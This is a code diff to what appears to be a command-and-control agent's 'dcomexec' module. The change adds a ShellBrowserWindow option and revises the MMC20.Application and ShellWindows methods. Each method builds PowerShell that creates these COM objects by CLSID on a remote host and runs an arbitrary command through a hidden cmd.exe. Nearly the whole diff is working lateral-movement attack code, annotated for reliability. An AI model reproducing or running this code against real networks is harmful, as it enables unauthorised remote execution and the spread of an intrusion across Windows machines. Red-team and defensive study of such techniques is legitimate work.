@@ -29,7 +29,11 @@ class DcomExecuteArguments(TaskArguments):
                 cli_name="method",
                 display_name="DCOM Method",
                 type=ParameterType.String,
-                description="DCOM object to use: mmc20 (MMC20.Application) or shellwindows (ShellWindows). Default: mmc20.",
+                description=(
+                    "DCOM object to use: mmc20 (MMC20.Application), "
+                    "shellwindows (ShellWindows), or shellbrowserwindow (ShellBrowserWindow). "
+                    "Default: mmc20."
+                ),
                 default_value="mmc20",
                 parameter_group_info=[ParameterGroupInfo(required=False, ui_position=3)],
             ),
@@ -46,8 +50,8 @@ class DcomExecuteArguments(TaskArguments):
 class DcomExecuteCommand(CommandBase):
     cmd = "dcomexec"
     needs_admin = False
-    help_cmd = "dcomexec -command <cmd> [-host <host>] [-method mmc20|shellwindows]"
-    description = "Script-only DCOM lateral execution wrapper (MMC20.Application or ShellWindows) via PowerShell."
+    help_cmd = "dcomexec -command <cmd> [-host <host>] [-method mmc20|shellwindows|shellbrowserwindow]"
+    description = "Script-only DCOM lateral execution wrapper (MMC20.Application, ShellWindows, or ShellBrowserWindow) via PowerShell."
     version = 1
     author = "@Lavender-exe"
     argument_class = DcomExecuteArguments
@@ -68,23 +72,38 @@ class DcomExecuteCommand(CommandBase):
         display_params += f" -method {method}"
         response.DisplayParams = display_params
 
-        # Escape single quotes inside command/host for embedding in PowerShell single-quoted strings
+        # Escape single quotes inside command/params for PowerShell single-quoted strings
         escaped_cmd = command.replace("'", "''")
+        # cmd.exe /Q /c wrapper — matches impacket's approach for reliable remote exec
+        ps_params = f"/Q /c {escaped_cmd}"
         target = f"'{host}'" if host else "'127.0.0.1'"
 
         if method == "shellwindows":
+            # ShellWindows (CLSID 9BA05972-F6A8-11CF-A442-00A0C90A8F39)
+            # Requires at least one open Explorer window on the target — Item(0) gets it.
+            # ShellExecute(file, params, dir, verb, show)
             ps_block = (
                 f"$c = [activator]::CreateInstance([type]::GetTypeFromCLSID("
                 f"'9BA05972-F6A8-11CF-A442-00A0C90A8F39', {target}));"
-                f"$item = $c.Item();"
-                f"$item.Document.Application.ShellExecute('{escaped_cmd}', $null, $null, $null, 0)"
+                f"$item = $c.Item(0);"
+                f"$item.Document.Application.ShellExecute('cmd.exe', '{ps_params}', 'C:\\Windows\\System32', $null, 0)"
+            )
+        elif method == "shellbrowserwindow":
+            # ShellBrowserWindow (CLSID C08AFD90-F2A1-11D1-8455-00A0C91F3880)
+            # Does NOT require an existing Explorer window — more reliable than ShellWindows.
+            # ShellExecute(file, params, dir, verb, show)
+            ps_block = (
+                f"$c = [activator]::CreateInstance([type]::GetTypeFromCLSID("
+                f"'C08AFD90-F2A1-11D1-8455-00A0C91F3880', {target}));"
+                f"$c.Document.Application.ShellExecute('cmd.exe', '{ps_params}', 'C:\\Windows\\System32', $null, 0)"
             )
         else:
-            # MMC20.Application (default)
+            # MMC20.Application (CLSID 49B2791A-B1AE-4C90-9B8E-E860BA07F889) — default
+            # ExecuteShellCommand(file, reserved, params, windowstate)
             ps_block = (
                 f"$c = [activator]::CreateInstance([type]::GetTypeFromCLSID("
                 f"'49B2791A-B1AE-4C90-9B8E-E860BA07F889', {target}));"
-                f"$c.Document.ActiveView.ExecuteShellCommand('{escaped_cmd}', $null, $null, '7')"
+                f"$c.Document.ActiveView.ExecuteShellCommand('C:\\Windows\\System32\\cmd.exe', $null, '{ps_params}', '7')"
             )
 
         await SendMythicRPCTaskCreateSubtask(
